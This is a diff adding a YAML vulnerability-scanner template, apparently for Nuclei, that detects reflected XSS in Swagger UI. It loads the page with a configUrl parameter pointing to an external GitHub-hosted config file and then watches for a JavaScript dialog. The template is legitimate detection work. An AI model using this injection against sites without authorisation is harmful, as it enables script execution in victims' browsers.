@@ -1,0 +1,31 @@
+id: swagger-ui-xss-detection
+
+info:
+  name: Swagger UI XSS Detection
+  author: LRVT
+  severity: high
+  description: Detects reflected XSS vulnerabilities in Swagger UI by injecting a malicious config URL and checking for a JavaScript dialog.
+  tags: xss, swagger, headless
+
+headless:
+  - steps:
+      # Navigate to the Swagger UI page with the malicious `configUrl` parameter
+      - action: navigate
+        args:
+          url: "{{BaseURL}}{{SwaggerPath}}/index.html?configUrl=https://raw.githubusercontent.com/pentestfactory/swagger-ui-xss/main/config.json"
+
+      # Wait for a JavaScript dialog to appear (e.g., alert, prompt, confirm)
+      - action: waitdialog
+        name: reflected_xss_dialog
+
+    payloads:
+      SwaggerPath:
+        - "/swagger-ui"
+        - "/api-docs"
+        - "/swagger"
+        - "/v1/swagger"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_xss_dialog == true
